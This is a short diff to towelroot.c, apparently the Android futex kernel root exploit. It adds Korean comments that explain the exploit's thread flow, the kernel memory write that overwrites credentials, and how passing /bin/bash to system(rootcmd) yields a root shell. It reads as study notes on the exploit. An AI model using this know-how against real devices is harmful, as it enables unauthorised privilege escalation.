@@ -23,6 +23,20 @@ towelroot.c
 #include <errno.h>
 #include <signal.h>
 
+/*
+	call path:
+		main()
+			init_exploit():
+				[th1]: accept_socket(): TCP 서버 소켓 하나 대기 시켜서 접속 받고 리턴함.
+				[th2]: search_goodnum(): 익스플로잇 설정 ...
+					wake_actionthread 쓰레드 두 개 켬.
+						write_kernel() 함수로 커널 메모리에 접근해서 크리덴셜 등 갱신하고 setuid가 0일때
+						익스플로잇 실행 인자로 전달된 path의 파일 (/bin/sh) 실행.
+				[th3]: send_magicmsg(): 설정된(획득한) MAGIC, MAGIC_ALT 메시지(msg)를 전송.
+
+
+*/
+
 //#define FUTEX_LOCK_PI            6
 //#define FUTEX_WAIT_REQUEUE_PI   11
 //#define FUTEX_CMP_REQUEUE_PI    12
@@ -341,7 +355,7 @@ void write_kernel(int signum)
     sleep(1);
 
     if (g_argc >= 2) {
-        system(rootcmd);
+        system(rootcmd); // /bin/bash로 인자를 넘겨야 함. 그러면 쉘 실행됨.
     }
     system("/system/bin/touch /dev/rooted"); // /dev/rooted 디바이스 생성.
 
